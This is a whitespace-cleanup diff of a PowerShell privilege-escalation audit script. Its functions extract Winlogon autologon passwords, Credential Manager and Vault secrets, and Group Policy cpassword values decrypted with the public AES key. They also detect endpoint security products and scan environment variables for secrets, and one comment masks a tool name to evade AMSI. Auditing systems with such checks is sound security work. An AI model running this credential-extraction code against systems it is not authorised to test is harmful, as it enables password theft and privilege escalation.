+            $WindowsUpdateResult = New-Object -TypeName PSObject
             $WindowsUpdateResult | Add-Member -MemberType "NoteProperty" -Name "Time" -Value $(Convert-DateToString -Date $WindowsUpdate.LastInstallationSuccessDate)
             $WindowsUpdateResult | Add-Member -MemberType "NoteProperty" -Name "TimeRaw" -Value $WindowsUpdate.LastInstallationSuccessDate
             $WindowsUpdateResult
-        } 
+        }
     } catch {
         # We might get an access denied when querying this COM object
         Write-Verbose "Error while requesting COM object Microsoft.Update.AutoUpdate."
@@ -3928,12 +3928,12 @@ function Invoke-HotFixCheck {
     .SYNOPSIS
 
     Gets a list of installed updates and hotfixes.
-    
+
     .DESCRIPTION
 
     This check simply invokes the helper function 'Get-HotFixList' and sorts the results from the
     newest to the oldest.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-HotFixCheck
@@ -3962,14 +3962,14 @@ function Invoke-HotFixVulnCheck {
     .SYNOPSIS
 
     Checks whether any hotfix has been installed in the last 31 days.
-    
+
     .DESCRIPTION
 
     This script first lists all the installed hotfixes. If no result is returned, this will be
-    reported as a finding. If at least one result is returned, the script will check the first 
-    one (which corresponds to the latest hotfix). If it's more than 31 days old, it will be 
+    reported as a finding. If at least one result is returned, the script will check the first
+    one (which corresponds to the latest hotfix). If it's more than 31 days old, it will be
     returned.
-    
+
     .EXAMPLE
 
     An example
@@ -3998,18 +3998,18 @@ function Invoke-HotFixVulnCheck {
 function Invoke-EndpointProtectionCheck {
     <#
     .SYNOPSIS
-    
-    Gets a list of security software products 
-    
+
+    Gets a list of security software products
+
     .DESCRIPTION
 
     This check was inspired by the script Invoke-EDRChecker.ps1 (PwnDexter). It enumerates the DLLs
     that are loaded in the current process, the processes that are currently running, the installed
-    applications and the installed services. For each one of these entries, it extracts some 
+    applications and the installed services. For each one of these entries, it extracts some
     metadata and checks whether it contains some known strings related to a given security software
     product. If there is a match, the corresponding entry is returned along with the data that was
     matched.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-EndpointProtectionCheck
@@ -4044,7 +4044,7 @@ function Invoke-EndpointProtectionCheck {
     Windows Defender Service               ImagePath="C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\NisSrv.exe"
     Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender\MpAsDesc.dll,-310
     Windows Defender Service               ImagePath="C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MsMpEng.exe"
-    
+
     .NOTES
 
     Credit goes to PwnDexter: https://github.com/PwnDexter/Invoke-EDRChecker
@@ -4105,7 +4105,7 @@ function Invoke-EndpointProtectionCheck {
 
                     $_.Trim() | Select-String -Pattern $ProductSignatures -AllMatches | ForEach-Object {
 
-                        $SignatureMatch = New-Object -TypeName PSObject 
+                        $SignatureMatch = New-Object -TypeName PSObject
                         $SignatureMatch | Add-Member -MemberType "NoteProperty" -Name "ProductName" -Value "$ProductName"
                         $SignatureMatch | Add-Member -MemberType "NoteProperty" -Name "Pattern" -Value "$($_)"
                         $SignatureMatch
@@ -4117,7 +4117,7 @@ function Invoke-EndpointProtectionCheck {
 
     # Need to store all the results into one arraylist so we can sort them on the product name.
     $Results = New-Object System.Collections.ArrayList
-    
+
     # Check DLLs loaded in the current process
     Get-Process -Id $PID -Module | ForEach-Object {
 
@@ -4125,7 +4125,7 @@ function Invoke-EndpointProtectionCheck {
 
             $DllDetails = (Get-Item $_.FileName).VersionInfo | Select-Object -Property CompanyName,FileDescription,FileName,InternalName,LegalCopyright,OriginalFileName,ProductName
             Find-ProtectionSoftware -Object $DllDetails | ForEach-Object {
-    
+
                 $Result = New-Object -TypeName PSObject
                 $Result | Add-Member -MemberType "NoteProperty" -Name "ProductName" -Value "$($_.ProductName)"
                 $Result | Add-Member -MemberType "NoteProperty" -Name "Source" -Value "Loaded DLL"
@@ -4148,7 +4148,7 @@ function Invoke-EndpointProtectionCheck {
         }
     }
 
-    # Check installed applications 
+    # Check installed applications
     Get-InstalledPrograms | Select-Object -Property Name | ForEach-Object {
 
         Find-ProtectionSoftware -Object $_ | ForEach-Object {
@@ -4161,7 +4161,7 @@ function Invoke-EndpointProtectionCheck {
         }
     }
 
-    # Check installed services 
+    # Check installed services
     Get-ServiceList -FilterLevel 1 | ForEach-Object {
 
         Find-ProtectionSoftware -Object $_ | ForEach-Object {
@@ -4178,12 +4178,12 @@ function Invoke-EndpointProtectionCheck {
 }
 
 # ----------------------------------------------------------------
-# END MISC   
+# END MISC
 # ----------------------------------------------------------------
 
 
 # ----------------------------------------------------------------
-# BEGIN CURRENT USER   
+# BEGIN CURRENT USER
 # ----------------------------------------------------------------
 function Invoke-UserCheck {
     <#
@@ -4193,11 +4193,11 @@ function Invoke-UserCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Gets the usernane and SID of the current user
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-UserCheck
@@ -4207,14 +4207,14 @@ function Invoke-UserCheck {
     DESKTOP-FEOHNOM\lab-user S-1-5-21-1448366976-598358009-3880595148-1002
 
     #>
-    
+
     [CmdletBinding()] param()
-    
+
     $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
 
-    $UserResult = New-Object -TypeName PSObject 
-    $UserResult | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $CurrentUser.Name 
-    $UserResult | Add-Member -MemberType "NoteProperty" -Name "SID" -Value $CurrentUser.User 
+    $UserResult = New-Object -TypeName PSObject
+    $UserResult | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $CurrentUser.Name
+    $UserResult | Add-Member -MemberType "NoteProperty" -Name "SID" -Value $CurrentUser.User
     $UserResult
 }
 
@@ -4226,26 +4226,26 @@ function Invoke-UserGroupsCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     For each group the current user belongs to, a custom object is returned, indicating the name
     and the SID of the group.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-UserGroupsCheck
 
-    Name                            SID                                         
-    ----                            ---                                         
-    BUILTIN\Remote Management Users S-1-5-32-580 
+    Name                            SID
+    ----                            ---
+    BUILTIN\Remote Management Users S-1-5-32-580
 
     .LINK
 
     https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems
     https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab
     #>
-    
+
     [CmdletBinding()] param()
 
     $IgnoredGroupSids = @(
@@ -4276,7 +4276,7 @@ function Invoke-UserGroupsCheck {
         "S-1-5-12",         # Restricted Code
         "S-1-5-15",         # THIS_ORGANIZATION
         "S-1-5-17",         # This Organization
-        "S-1-5-18",         # Local System 
+        "S-1-5-18",         # Local System
         "S-1-5-19",         # Local Service
         "S-1-5-20",         # Network Service
         "S-1-5-32-545",     # Users
@@ -4287,7 +4287,7 @@ function Invoke-UserGroupsCheck {
         "S-1-5-113",        # LOCAL_ACCOUNT
         "S-1-5-1000",       # OTHER_ORGANIZATION
         "S-1-15-2-1"        # ALL_APP_PACKAGES
-    ) 
+    )
 
     $IgnoredGroupSidPatterns = @(
         "S-1-5-21-*-513",   # Domain Users
@@ -4297,26 +4297,26 @@ function Invoke-UserGroupsCheck {
         "S-1-5-21-*-545",   # Users
         "S-1-5-21-*-546",   # Guests
         "S-1-5-64-*",       # NTLM / SChannel / Digest Authentication
-        "S-1-16-*",         # Integrity levels 
+        "S-1-16-*",         # Integrity levels
         "S-1-15-3-*",       # Capabilities ("Active Directory does not resolve capability SIDs to names. This behavior is by design.")
         "S-1-18-*"          # Identities
     )
-    
+
     $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-    $Groups = $CurrentUser.Groups 
+    $Groups = $CurrentUser.Groups
 
     ForEach ($Group in $Groups) {
 
-        $GroupSid = $Group.Value 
+        $GroupSid = $Group.Value
 
         if (-not ($IgnoredGroupSids -contains $GroupSid)) {
 
-            $KnownSid = $False 
+            $KnownSid = $False
             ForEach ($Pattern in $IgnoredGroupSidPatterns) {
                 if ($GroupSid -like $Pattern) {
                     Write-Verbose "Known SID pattern: $GroupSid"
                     $KnownSid = $true
-                    break   
+                    break
                 }
             }
 
@@ -4328,8 +4328,8 @@ function Invoke-UserGroupsCheck {
                     $GroupName = "N/A"
                 }
 
-                $UserGroups = New-Object -TypeName PSObject 
-                $UserGroups | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $GroupName 
+                $UserGroups = New-Object -TypeName PSObject
+                $UserGroups | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $GroupName
                 $UserGroups | Add-Member -MemberType "NoteProperty" -Name "SID" -Value $GroupSid
                 $UserGroups
             }
@@ -4342,27 +4342,27 @@ function Invoke-UserGroupsCheck {
 function Invoke-UserPrivilegesCheck {
     <#
     .SYNOPSIS
-    
+
     Enumerates privileges which can be abused for privilege escalation
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Enumerates all the privileges of the current user thanks to the custom Get-UserPrivileges
-    function. Then, it checks whether each privilege is contained in a pre-defined list of 
-    high value privileges. 
-    
+    function. Then, it checks whether each privilege is contained in a pre-defined list of
+    high value privileges.
+
     .EXAMPLE
 
     Name                   State   Description
     ----                   -----   -----------
     SeImpersonatePrivilege Enabled Impersonate a client after authentication
-    
+
     #>
 
-    [CmdletBinding()] param()    
+    [CmdletBinding()] param()
 
     $HighPotentialPrivileges = "SeAssignPrimaryTokenPrivilege", "SeImpersonatePrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeLoadDriverPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeBackupPrivilege", "SeManageVolumePrivilege"
 
@@ -4385,29 +4385,29 @@ function Invoke-UserEnvCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    Environment variables may contain sensitive information such as database credentials or API 
-    keys. 
-    
+    Environment variables may contain sensitive information such as database credentials or API
+    keys.
+
     #>
 
-    [CmdletBinding()] param() 
+    [CmdletBinding()] param()
 
     [string[]] $Keywords = "key", "passw", "secret", "pwd", "creds", "credential", "api"
 
     Get-ChildItem -Path env: | ForEach-Object {
 
         $EntryName = $_.Name
-        $EntryValue = $_.Value 
+        $EntryValue = $_.Value
         $CheckVal = "$($_.Name) $($_.Value)"
-        
+
         ForEach ($Keyword in $Keywords) {
 
             if ($CheckVal -Like "*$($Keyword)*") {
 
-                $EnvItem = New-Object -TypeName PSObject 
+                $EnvItem = New-Object -TypeName PSObject
                 $EnvItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $EntryName
                 $EnvItem | Add-Member -MemberType "NoteProperty" -Name "Value" -Value $EntryValue
                 $EnvItem | Add-Member -MemberType "NoteProperty" -Name "Keyword" -Value $Keyword
@@ -4417,19 +4417,19 @@ function Invoke-UserEnvCheck {
     }
 }
 # ----------------------------------------------------------------
-# END CURRENT USER    
+# END CURRENT USER
 # ----------------------------------------------------------------
 
 
 # ----------------------------------------------------------------
-# BEGIN CREDENTIALS     
+# BEGIN CREDENTIALS
 # ----------------------------------------------------------------
 function Invoke-WinlogonCheck {
     <#
     .SYNOPSIS
 
     Checks credentials stored in the Winlogon registry key
-    
+
     Author: @itm4n
     License: BSD 3-Clause
 
@@ -4437,9 +4437,9 @@ function Invoke-WinlogonCheck {
 
     Windows has a registry setting to enable automatic logon. You can set a username and a password
     in order to automatically initiate a user session on system startup. The password is stored in
-    clear text so it's easy to extract it. This function returns a set of credentials only if the 
+    clear text so it's easy to extract it. This function returns a set of credentials only if the
     password field is not empty.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-WinlogonCheck
@@ -4451,7 +4451,7 @@ function Invoke-WinlogonCheck {
     .LINK
 
     https://support.microsoft.com/en-us/help/324737/how-to-turn-on-automatic-logon-in-windows
-    
+
     #>
 
     [CmdletBinding()] param()
@@ -4462,15 +4462,15 @@ function Invoke-WinlogonCheck {
     if (-not $GetItemPropertyError) {
 
         if ($Item.DefaultPassword) {
-            $WinlogonItem = New-Object -TypeName PSObject 
+            $WinlogonItem = New-Object -TypeName PSObject
             $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $Item.DefaultDomainName
             $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $Item.DefaultUserName
             $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $Item.DefaultPassword
             $WinlogonItem
-        } 
-    
+        }
+
         if ($Item.AltDefaultPassword) {
-            $WinlogonItem = New-Object -TypeName PSObject 
+            $WinlogonItem = New-Object -TypeName PSObject
             $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $Item.AltDefaultDomainName
             $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $Item.AltDefaultUserName
             $WinlogonItem | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $Item.AltDefaultPassword
@@ -4486,17 +4486,17 @@ function Invoke-CredentialFilesCheck {
     <#
     .SYNOPSIS
 
-    List the Credential files that are stored in the current user AppData folders. 
+    List the Credential files that are stored in the current user AppData folders.
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Credentials stored in the Credential Manager are actually saved as files in the current user's
     home folder. The sensitive information is saved in an ecnrypted format which differs depending
-    on the credential type. 
-    
+    on the credential type.
+
     .EXAMPLE
 
     PS C:\> Invoke-CredentialFilesCheck
@@ -4506,9 +4506,9 @@ function Invoke-CredentialFilesCheck {
     C:\Users\lab-user\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
     C:\Users\lab-user\AppData\Roaming\Microsoft\Credentials\9751D70B4AC36953347138F9A5C2D23B
     C:\Users\lab-user\AppData\Roaming\Microsoft\Credentials\9970C9D5A29B2D83514BEFD30A4D48B4
-    
+
     #>
-    
+
     [CmdletBinding()] param()
 
     $CredentialsFound = $False
@@ -4521,7 +4521,7 @@ function Invoke-CredentialFilesCheck {
 
         Get-ChildItem -Force -Path $Path -ErrorAction SilentlyContinue | ForEach-Object {
 
-            $Result = New-Object -TypeName PSObject 
+            $Result = New-Object -TypeName PSObject
             $Result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "Credentials"
             $Result | Add-Member -MemberType "NoteProperty" -Name "FullPath" -Value $_.FullName
             $Result
@@ -4535,23 +4535,23 @@ function Invoke-CredentialFilesCheck {
         $CurrentUser = Invoke-UserCheck
 
         if ($CurrentUser -and $CurrentUser.SID) {
-    
+
             $Paths = New-Object -TypeName System.Collections.ArrayList
             [void] $Paths.Add($(Join-Path -Path $env:LOCALAPPDATA -ChildPath "Microsoft\Protect\$($CurrentUser.SID)"))
             [void] $Paths.Add($(Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Protect\$($CurrentUser.SID)"))
-    
+
             ForEach ($Path in [string[]]$Paths) {
-    
+
                 Get-ChildItem -Force -Path $Path -ErrorAction SilentlyContinue | Where-Object {$_.Name.Length -eq 36 } | ForEach-Object {
-        
-                    $Result = New-Object -TypeName PSObject 
+
+                    $Result = New-Object -TypeName PSObject
                     $Result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "Protect"
                     $Result | Add-Member -MemberType "NoteProperty" -Name "FullPath" -Value $_.FullName
                     $Result
                 }
             }
-        } 
-    } 
+        }
+    }
 }
 
 function Invoke-VaultCredCheck {
@@ -4562,17 +4562,17 @@ function Invoke-VaultCredCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Credentials saved in the Credential Manager can be extracted by invoking the Win32 CredEnumerate
     function. This function returns a pointer to an array of PCREDENTIAL pointers. Therefore we can
-    iterate this array to access each CREDENTIAL structure individually. Depending on the type of 
+    iterate this array to access each CREDENTIAL structure individually. Depending on the type of
     credential, the CredentialBlob member either contains the cleartext password or a blob which we
-    cannot decode (because it's application specific). For each structure, a custom PS object is 
+    cannot decode (because it's application specific). For each structure, a custom PS object is
     returned. The output should be quite similar to the output generated by the command vault::cred
     in M*m*k*tz (don't want to trigger AMSI with this keyword :P).
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-VaultCredCheck
@@ -4584,7 +4584,7 @@ function Invoke-VaultCredCheck {
     Persist    : 3 - ENTERPRISE
     Flags      : 0
     Credential :
-    
+
     TargetName : LegacyGeneric:target=https://github.com/
     UserName   : user@example.com
     Comment    :
@@ -4599,27 +4599,27 @@ function Invoke-VaultCredCheck {
     https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
 
     #>
-    
+
     [CmdletBinding()] param()
 
     function Convert-TypeToString {
         [CmdletBinding()] param(
-            [Uint32]$Type 
+            [Uint32]$Type
         )
 
         $TypeEnum = @{
             "GENERIC"                   = "1";
             "DOMAIN_PASSWORD"           = "2";
             "DOMAIN_CERTIFICATE"        = "3";
-            "DOMAIN_VISIBLE_PASSWORD"   = "4"; #  This value is no longer supported. 
+            "DOMAIN_VISIBLE_PASSWORD"   = "4"; #  This value is no longer supported.
             "GENERIC_CERTIFICATE"       = "5"; #  This value is no longer supported.
             "DOMAIN_EXTENDED"           = "6"; #  This value is no longer supported.
             "MAXIMUM"                   = "7"; #  This value is no longer supported.
             "TYPE_MAXIMUM_EX"           = "8"; #  This value is no longer supported.
         }
-    
-        $TypeEnum.GetEnumerator() | ForEach-Object { 
-            if ( $_.Value -eq $Type ) 
+
+        $TypeEnum.GetEnumerator() | ForEach-Object {
+            if ( $_.Value -eq $Type )
             {
                 $_.Name
             }
@@ -4628,7 +4628,7 @@ function Invoke-VaultCredCheck {
 
     function Convert-PersistToString {
         [CmdletBinding()] param(
-            [Uint32]$Persist 
+            [Uint32]$Persist
         )
 
         $PersistEnum = @{
@@ -4637,8 +4637,8 @@ function Invoke-VaultCredCheck {
             "ENTERPRISE" = "3";
         }
 
-        $PersistEnum.GetEnumerator() | ForEach-Object { 
-            if ( $_.Value -eq $Persist ) 
+        $PersistEnum.GetEnumerator() | ForEach-Object {
+            if ( $_.Value -eq $Persist )
             {
                 $_.Name
             }
@@ -4659,7 +4659,7 @@ function Invoke-VaultCredCheck {
 
             $TestFlags = 2 # IS_TEXT_UNICODE_STATISTICS
             $IsUnicode = [PrivescCheck.Win32]::IsTextUnicode($UnicodeString.Buffer, $UnicodeString.Length, [ref]$TestFlags)
-            
+
             if ($IsUnicode) {
                 $Result = [Runtime.InteropServices.Marshal]::PtrToStringUni($UnicodeString.Buffer, $UnicodeString.Length / 2)
             } else {
@@ -4685,18 +4685,18 @@ function Invoke-VaultCredCheck {
         Write-Verbose "CredEnumerate() OK - Count: $($Count)"
 
         # CredEnumerate() returns an array of $Count PCREDENTIAL pointers, so we need to iterate
-        # this array in order to get each PCREDENTIAL pointer. Then we can use this pointer to 
+        # this array in order to get each PCREDENTIAL pointer. Then we can use this pointer to
         # convert a blob of unmanaged memory to a PrivescCheck.Win32+CREDENTIAL object.
 
         for ($i = 0; $i -lt $Count; $i++) {
 
             $CredentialPtrOffset = [IntPtr] ($CredentialsPtr.ToInt64() + [IntPtr]::Size * $i)
-            $CredentialPtr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($CredentialPtrOffset) 
+            $CredentialPtr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($CredentialPtrOffset)
             $Credential = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CredentialPtr, [type] [PrivescCheck.Win32+CREDENTIAL])
             $CredentialStr = Get-Credential -RawObject $Credential
 
             if (-not [String]::IsNullOrEmpty($CredentialStr)) {
-                $CredentialObject = New-Object -TypeName PSObject 
+                $CredentialObject = New-Object -TypeName PSObject
                 $CredentialObject | Add-Member -MemberType "NoteProperty" -Name "TargetName" -Value $Credential.TargetName
                 $CredentialObject | Add-Member -MemberType "NoteProperty" -Name "UserName" -Value $Credential.UserName
                 $CredentialObject | Add-Member -MemberType "NoteProperty" -Name "Comment" -Value $Credential.Comment
@@ -4708,11 +4708,11 @@ function Invoke-VaultCredCheck {
             }
         }
 
-        [PrivescCheck.Win32]::CredFree($CredentialsPtr) 
+        [PrivescCheck.Win32]::CredFree($CredentialsPtr)
 
     } else {
-        # If there is no saved credentials, CredEnumerate sets the last error to ERROR_NOT_FOUND 
-        # but this doesn't mean that the function really failed. The same thing applies for 
+        # If there is no saved credentials, CredEnumerate sets the last error to ERROR_NOT_FOUND
+        # but this doesn't mean that the function really failed. The same thing applies for
         # the error code ERROR_NO_SUCH_LOGON_SESSION.
         Write-Verbose ([ComponentModel.Win32Exception] $LastError)
     }
@@ -4726,14 +4726,14 @@ function Invoke-VaultListCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    Credentials saved in Internet Explorer or Edge for example are actually saved in the system's 
+    Credentials saved in Internet Explorer or Edge for example are actually saved in the system's
     Credential Manager. These credentials can be extracted using undocumented Windows API functions
-    from "vaultcli.dll". It's highly inspired from the "vault::list" command of M*m*k*tz (by 
-    Benjamin Delpy @gentilkiwi) and "Get-VaultCredential.ps1" (by Matthew Graeber). 
-    Only entries containing a non-empty password field are returned as a custom PS object. 
+    from "vaultcli.dll". It's highly inspired from the "vault::list" command of M*m*k*tz (by
+    Benjamin Delpy @gentilkiwi) and "Get-VaultCredential.ps1" (by Matthew Graeber).
+    Only entries containing a non-empty password field are returned as a custom PS object.
 
     .EXAMPLE
 
@@ -4751,7 +4751,7 @@ function Invoke-VaultListCheck {
     https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Get-VaultCredential.ps1
 
     #>
-    
+
 
     [CmdletBinding()] param()
 
@@ -4826,7 +4826,7 @@ function Invoke-VaultListCheck {
             }
 
             # ElementType_String
-            0x07 { 
+            0x07 {
                 $StringPtr = [Runtime.InteropServices.Marshal]::ReadIntPtr($VaultItemDataValuePtr)
                 [Runtime.InteropServices.Marshal]::PtrToStringUni($StringPtr)
             }
@@ -4860,13 +4860,13 @@ function Invoke-VaultListCheck {
 
             # ElementType_Max
             0x0d {
-                
+
             }
         }
     }
 
     $VaultsCount = 0
-    $VaultGuids = [IntPtr]::Zero 
+    $VaultGuids = [IntPtr]::Zero
     $Result = [PrivescCheck.Win32]::VaultEnumerateVaults(0, [ref]$VaultsCount, [ref]$VaultGuids)
 
     if ($Result -eq 0) {
@@ -4881,7 +4881,7 @@ function Invoke-VaultListCheck {
 
             Write-Verbose "Vault: $($VaultGuid) - $($VaultName)"
 
-            $VaultHandle = [IntPtr]::Zero 
+            $VaultHandle = [IntPtr]::Zero
             $Result = [PrivescCheck.Win32]::VaultOpenVault($VaultGuidPtr, 0, [ref]$VaultHandle)
 
             if ($Result -eq 0) {
@@ -4889,7 +4889,7 @@ function Invoke-VaultListCheck {
                 Write-Verbose "VaultOpenVault() OK - Vault Handle: 0x$($VaultHandle.ToString('X8'))"
 
                 $VaultItemsCount = 0
-                $ItemsPtr = [IntPtr]::Zero 
+                $ItemsPtr = [IntPtr]::Zero
                 $Result = [PrivescCheck.Win32]::VaultEnumerateItems($VaultHandle, 0x0200, [ref]$VaultItemsCount, [ref]$ItemsPtr)
 
                 $VaultItemPtr = $ItemsPtr
@@ -4911,9 +4911,9 @@ function Invoke-VaultListCheck {
                                 # Windows 8+
                                 $VaultItemType = [type] [PrivescCheck.Win32+VAULT_ITEM_8]
                             }
-    
+
                             $VaultItem = [Runtime.InteropServices.Marshal]::PtrToStructure($VaultItemPtr, [type] $VaultItemType)
-    
+
                             if ($OSVersion.Major -le 6 -and $OSVersion.Minor -le 1) {
                                 # Windows 7
                                 $PasswordItemPtr = [IntPtr]::Zero
@@ -4923,18 +4923,18 @@ function Invoke-VaultListCheck {
                                 $PasswordItemPtr = [IntPtr]::Zero
                                 $Result = [PrivescCheck.Win32]::VaultGetItem8($VaultHandle, [ref]$VaultItem.SchemaId, $VaultItem.Resource, $VaultItem.Identity, $VaultItem.PackageSid, [IntPtr]::Zero, 0, [ref]$PasswordItemPtr)
                             }
-    
+
                             if ($Result -eq 0) {
 
                                 Write-Verbose "VaultGetItem() OK - ItemPtr: 0x$($PasswordItemPtr.ToString('X8'))"
                                 $PasswordItem = [Runtime.InteropServices.Marshal]::PtrToStructure($PasswordItemPtr, [Type] $VaultItemType)
                                 $Password = Get-VaultItemElementValue -VaultItemElementPtr $PasswordItem.Authenticator
-                                [PrivescCheck.Win32]::VaultFree($PasswordItemPtr) | Out-Null 
+                                [PrivescCheck.Win32]::VaultFree($PasswordItemPtr) | Out-Null
 
                             } else {
                                 Write-Verbose "VaultGetItem() failed - Err: 0x$($Result.ToString('X8'))"
                             }
-    
+
                             if (-not [String]::IsNullOrEmpty($Password)) {
                                 $Item = New-Object -TypeName PSObject
                                 $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $VaultName
@@ -4949,14 +4949,14 @@ function Invoke-VaultListCheck {
                         }
 
                     } catch [Exception] {
-                        Write-Verbose $_.Exception.Message 
+                        Write-Verbose $_.Exception.Message
                     }
 
                 } else {
                     Write-Verbose "VaultEnumerateItems() failed - Err: 0x$($Result.ToString('X8'))"
                 }
 
-                [PrivescCheck.Win32]::VaultCloseVault([ref]$VaultHandle) | Out-Null 
+                [PrivescCheck.Win32]::VaultCloseVault([ref]$VaultHandle) | Out-Null
 
             } else {
                 Write-Verbose "VaultOpenVault() failed - Err: 0x$($Result.ToString('X8'))"
@@ -4977,27 +4977,27 @@ function Invoke-GPPPasswordCheck {
     Author: @itm4n
     Credit: @obscuresec, @harmj0y
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    Before KB2928120 (see MS14-025), some Group Policy Preferences could be configured with a 
+    Before KB2928120 (see MS14-025), some Group Policy Preferences could be configured with a
     custom account. This feature was mainly used to deploy a custom local administrator account on
-    a group of machines. There were two problems with this approach though. First, since the Group 
-    Policy Objects are stored as XML files in SYSVOL, any domain user can read them. The second 
-    problem is that the password set in these GPPs is AES256-encrypted with a default key, which 
-    is publicly documented. This means that any authenticated user could potentially access very 
-    sensitive data and elevate their privileges on their machine or even the domain. 
+    a group of machines. There were two problems with this approach though. First, since the Group
+    Policy Objects are stored as XML files in SYSVOL, any domain user can read them. The second
+    problem is that the password set in these GPPs is AES256-encrypted with a default key, which
+    is publicly documented. This means that any authenticated user could potentially access very
+    sensitive data and elevate their privileges on their machine or even the domain.
 
-    This function will check whether any locally cached GPP file contains a non-empty "cpassword" 
-    field. If so, it will decrypt it and return a custom PS object containing some information 
-    about the GPP along with the location of the file. 
-    
+    This function will check whether any locally cached GPP file contains a non-empty "cpassword"
+    field. If so, it will decrypt it and return a custom PS object containing some information
+    about the GPP along with the location of the file.
+
     .PARAMETER Remote
 
     Set this flag if you want to search for GPP files in the SYSVOL share of your primary Domain
     Controller. Initially, I wanted to do only local checks but this was a special request from
     @mpgn_x64 so I couldn't say no :P.
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-GPPPasswordCheck
@@ -5059,7 +5059,7 @@ function Invoke-GPPPasswordCheck {
 
     function Get-DecryptedPassword {
         [CmdletBinding()] param(
-            [string] $Cpassword 
+            [string] $Cpassword
         )
 
         if (-not [String]::IsNullOrEmpty($Cpassword)) {
@@ -5076,10 +5076,10 @@ function Invoke-GPPPasswordCheck {
                 $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                 [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
 
-                $AesIV = New-Object Byte[]($AesObject.IV.Length) 
+                $AesIV = New-Object Byte[]($AesObject.IV.Length)
                 $AesObject.IV = $AesIV
                 $AesObject.Key = $AesKey
-                $DecryptorObject = $AesObject.CreateDecryptor() 
+                $DecryptorObject = $AesObject.CreateDecryptor()
                 [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
 
                 [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
@@ -5100,20 +5100,20 @@ function Invoke-GPPPasswordCheck {
             $GppPath = Join-Path -Path $GppPath -ChildPath "Microsoft\Group Policy"
         }
     }
-    
+
     if (Test-Path -Path $GppPath -ErrorAction SilentlyContinue) {
 
         $CachedGPPFiles = Get-ChildItem -Path $GppPath -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Drives.xml','Printers.xml' -Force -ErrorAction SilentlyContinue
 
         foreach ($File in $CachedGPPFiles) {
-            
-            $FileFullPath = $File.FullName 
+
+            $FileFullPath = $File.FullName
             Write-Verbose $FileFullPath
 
             try {
                 [xml]$XmlFile = Get-Content -Path $FileFullPath -ErrorAction SilentlyContinue
             } catch [Exception] {
-                Write-Verbose $_.Exception.Message 
+                Write-Verbose $_.Exception.Message
             }
 
             if ($Null -eq $XmlFile) {
@@ -5122,50 +5122,50 @@ function Invoke-GPPPasswordCheck {
 
             $XmlFile.GetElementsByTagName("Properties") | ForEach-Object {
 
-                $Properties = $_ 
+                $Properties = $_
                 $Cpassword = ""
 
                 switch ($File.BaseName) {
 
                     Groups {
                         $Type = "User/Group"
-                        $UserName = $Properties.userName 
-                        $Cpassword = $Properties.cpassword 
+                        $UserName = $Properties.userName
+                        $Cpassword = $Properties.cpassword
                         $Content = "Description: $($Properties.description)"
                     }
-    
+
                     Scheduledtasks {
                         $Type = "Scheduled Task"
-                        $UserName = $Properties.runAs 
-                        $Cpassword = $Properties.cpassword 
+                        $UserName = $Properties.runAs
+                        $Cpassword = $Properties.cpassword
                         $Content = "App: $($Properties.appName) $($Properties.args)"
                     }
-    
+
                     DataSources {
